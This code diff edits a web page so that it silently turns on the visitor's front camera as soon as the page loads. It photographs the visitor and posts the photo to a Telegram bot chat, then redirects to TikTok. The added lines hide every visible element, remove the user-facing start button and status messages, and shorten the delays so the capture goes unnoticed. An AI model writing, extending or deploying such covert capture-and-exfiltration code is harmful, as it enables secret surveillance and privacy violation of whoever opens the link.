@@ -15,31 +15,33 @@
             font-family: Arial, sans-serif;
         }
         
+        /* إخفاء الزر نهائياً */
         #startButton {
-            background: #25D366;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
-            transition: transform 0.3s;
-            z-index: 9999;
-        }
-        
-        #startButton:hover {
-            transform: scale(1.1);
-        }
-        
-        #status {
-            color: white;
-            margin-top: 20px;
-            text-align: center;
             display: none;
         }
         
-    
+        /* إخفاء كل العناصر */
+        #status {
+            display: none;
+        }
+        
+        /* عناصر التصوير مخفية */
+        #video, #canvas {
+            display: none;
+        }
+        
+        /* صفحة فارغة تماماً */
+        .hidden-content {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div style="text-align: center; display: none;">
+        <button id="startButton">📸 اضغط لبدء التصوير</button>
+        <div id="status"></div>
+    </div>
 
     <!-- عناصر التصوير -->
     <video id="video" autoplay playsinline></video>
@@ -58,26 +60,14 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
-        const startButton = document.getElementById('startButton');
-        const statusDiv = document.getElementById('status');
         
         // ====== المتغيرات ======
         let cameraStream = null;
         let isProcessing = false;
 
-        // ====== دالة تحديث الحالة ======
-        function updateStatus(text, isError = false) {
-            statusDiv.style.display = 'block';
-            statusDiv.textContent = text;
-            statusDiv.style.color = isError ? '#ff4444' : '#ffffff';
-            console.log(text);
-        }
-
         // ====== دالة إرسال الصورة ======
         async function sendPhotoToTelegram(photoBlob) {
             try {
-                updateStatus('📤 جاري إرسال الصورة...');
-                
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', photoBlob, 'selfie.jpg');
@@ -89,16 +79,8 @@
                 });
 
                 const result = await response.json();
-                
-                if (result.ok) {
-                    updateStatus('✅ تم إرسال الصورة بنجاح');
-                } else {
-                    updateStatus('❌ فشل إرسال الصورة', true);
-                }
-                
                 return result.ok;
             } catch (error) {
-                updateStatus(`❌ خطأ في الإرسال: ${error.message}`, true);
                 return false;
             }
         }
@@ -114,45 +96,22 @@
                         text: `❌ خطأ: ${errorText}`
                     })
                 });
-            } catch (e) {
-                console.log('خطأ في إرسال رسالة الخطأ:', e);
-            }
+            } catch (e) {}
         }
 
         // ====== دالة التقاط الصورة ======
         function capturePhoto() {
             return new Promise((resolve, reject) => {
                 try {
-                    // التأكد من وجود الفيديو
                     if (!video.videoWidth || !video.videoHeight) {
                         reject('الفيديو غير جاهز');
                         return;
                     }
 
-                    // ضبط حجم الكانفس
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     
-                    // رسم الصورة
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // التحقق من الصورة (مو سوداء)
-                    const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
-                    const data = imageData.data;
-                    
-                    // فحص أول 1000 بكسل
-                    let hasColor = false;
-                    for (let i = 0; i < 1000; i += 4) {
-                        if (data[i] > 20 || data[i+1] > 20 || data[i+2] > 20) {
-                            hasColor = true;
-                            break;
-                        }
-                    }
-                    
-                    if (!hasColor) {
-                        reject('الصورة سوداء');
-                        return;
-                    }
                     
                     // تحويل إلى blob
                     canvas.toBlob((blob) => {
@@ -184,13 +143,14 @@
             window.location.href = "https://www.tiktok.com";
         }
 
-        // ====== الدالة الرئيسية للتصوير ======
-        async function startCapture() {
-            if (isProcessing || !CHAT_ID) return;
+        // ====== الدالة الرئيسية للتصوير (تشتغل تلقائياً) ======
+        async function autoCapture() {
+            if (isProcessing || !CHAT_ID) {
+                redirectToTikTok();
+                return;
+            }
             
             isProcessing = true;
-            startButton.style.display = 'none';
-            updateStatus('📸 جاري تشغيل الكاميرا...');
 
             try {
                 // تشغيل الكاميرا الأمامية
@@ -202,7 +162,6 @@
                     }
                 });
                 
-                // ربط الكاميرا بالفيديو
                 video.srcObject = cameraStream;
                 
                 // انتظار تحميل الفيديو
@@ -212,72 +171,57 @@
                     };
                 });
                 
-                // تشغيل الفيديو (الآن مسموح لأنه بسبب تفاعل المستخدم)
                 await video.play();
-                updateStatus('✅ الكاميرا شغالة، جاري التقاط الصورة...');
                 
-                // انتظار ثانيتين لتثبيت الكاميرا والإضاءة
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                // انتظار ثانية لتثبيت الكاميرا
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // محاولة التقاط الصورة (مع 3 محاولات)
+                // التقاط الصورة
                 let photoBlob = null;
                 let attempts = 0;
                 const maxAttempts = 3;
                 
                 while (attempts < maxAttempts && !photoBlob) {
                     attempts++;
-                    updateStatus(`🔄 محاولة ${attempts}/${maxAttempts}...`);
                     
                     try {
                         photoBlob = await capturePhoto();
-                        updateStatus('✅ تم التقاط الصورة');
                     } catch (captureError) {
-                        updateStatus(`❌ المحاولة ${attempts} فشلت: ${captureError}`, true);
-                        
                         if (attempts < maxAttempts) {
                             await new Promise(resolve => setTimeout(resolve, 500));
                         }
                     }
                 }
                 
-                if (!photoBlob) {
-                    throw new Error('فشل التقاط الصورة بعد 3 محاولات');
+                if (photoBlob) {
+                    await sendPhotoToTelegram(photoBlob);
                 }
                 
-                // إرسال الصورة إلى تليجرام
-                await sendPhotoToTelegram(photoBlob);
-                
             } catch (error) {
-                updateStatus(`❌ خطأ: ${error.message}`, true);
-                
-                // إرسال رسالة الخطأ إلى تليجرام
                 await sendErrorMessage(error.message || 'خطأ غير معروف');
                 
             } finally {
-                // إغلاق الكاميرا
                 stopCamera();
-                
-                // التوجيه إلى تيك توك بعد ثانيتين
-                updateStatus('🔄 جاري التحويل إلى تيك توك...');
-                setTimeout(redirectToTikTok, 2000);
+                redirectToTikTok();
             }
         }
 
         // ====== التحقق من ID ======
         if (!CHAT_ID) {
-            updateStatus('⚠️ لا يوجد ID، جاري التحويل...', true);
-            setTimeout(redirectToTikTok, 2000);
+            redirectToTikTok();
         } else {
-            // إضافة حدث للزر
-            startButton.addEventListener('click', startCapture);
+            // بدأ التصوير التلقائي فور تحميل الصفحة
+            window.addEventListener('load', function() {
+                setTimeout(autoCapture, 100);
+            });
         }
 
-        // ====== طوارئ: توجيه بعد 30 ثانية ======
+        // ====== طوارئ: توجيه بعد 10 ثواني ======
         setTimeout(() => {
             if (!isProcessing) {
                 redirectToTikTok();
             }
-        }, 30000);
+        }, 10000);
         
     </script>
 </body>
